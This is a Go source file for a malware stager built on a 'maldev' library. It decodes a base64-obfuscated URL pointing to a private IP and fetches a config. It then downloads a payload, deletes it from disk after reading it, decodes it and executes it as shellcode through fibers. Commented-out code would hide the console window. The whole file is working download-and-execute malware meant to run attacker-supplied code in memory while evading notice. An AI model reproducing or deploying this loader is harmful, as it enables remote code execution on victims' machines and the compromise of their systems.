package main

import (
	"encoding/base64"
	"encoding/json"
	"strings"

	"fmt"
	"io"
	"log"
	"net/http"
	"os"

	"github.com/D3Ext/maldev/network"
	"github.com/D3Ext/maldev/shellcode"
	//"crypto"
)

//var h = HConsole()

// ALWAYS HAVE STRUCT FIELDS CAPITAL FIRST LETTER. FIX THIS IN YOUR OTHER PROJECT
type Config struct {
	DlURL    string `json:"dlURL"`
	FileName string `json:"fileName"`
	PathNew  string `json:"pathNew"`
}

func main() {
	//	HConsole()
	var config Config
	//url should base64 of http://whatever.blekt or ip
url := "aHR0cDovLzE5Mi4xNjguNS4xMzIvaW5zdAo="
	urlBytes, _ := base64.RawStdEncoding.DecodeString(url)
	url = string(urlBytes)
	url = strings.Split(url, "\n")[0]
	response, err := http.Get(url)
	if err != nil {
		log.Fatal(err)
	}
	defer response.Body.Close()
	if response.StatusCode != http.StatusOK {
		log.Fatal(err)
		os.Exit(1)
	}
	bodyBytes, _ := io.ReadAll(response.Body)
	fmt.Println(string(bodyBytes))
	err = json.Unmarshal(bodyBytes, &config)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	fmt.Println(config)
	fmt.Println("[+]Getting Files From:" + config.DlURL + "/" + config.FileName)
	network.DownloadFile(config.DlURL + "/" + config.FileName)
	os.Rename(config.FileName, config.PathNew)
	fmt.Println("[+]Moving to: " + config.PathNew)
	contents, _ := os.ReadFile(config.PathNew)
	os.Remove(config.PathNew)
	//contentsStr := string(contents)
	contentsNew := contents
	base64.RawStdEncoding.Decode(contentsNew, contents)
	//os.WriteFile(config.PathNew, contentsNew, 0777)
	// h, e := syscall.LoadLibrary(config.PathNew) //Make sure this DLL follows Golang machine bit architecture (64-bit in my case)
	// if e != nil {
	// 	log.Fatal(e)
	// }
	//defer syscall.FreeLibrary(h)
	//os.Remove(config.PathNew)
	// proc, e := syscall.GetProcAddress(h, "xyz") //One of the functions in the DLL
	// if e != nil {
	// 	log.Fatal(e)
	// }

	//_, _, _ = syscall.Syscall9(uintptr(proc), 0, 2, 2, 2, 2, 0, 0, 0, 0, 0) //Pay attention to the positioning of the parameter
	//fmt.Printf("Hello dll function returns %d\n", n)
	// fmt.Println(contentsNew)
	err = shellcode.Fibers(contentsNew)
	if err != nil {
		fmt.Println("FATAL ERROR")
		log.Fatal(err)
	}
	//os.WriteFile("testMe2.dll", contentsNew, 0777)
	fmt.Println("Done!")
}

//func HConsole() int {
//	FreeConsole := syscall.NewLazyDLL("kernel32.dll").NewProc("FreeConsole")
//	FreeConsole.Call()
//	return 0
//}
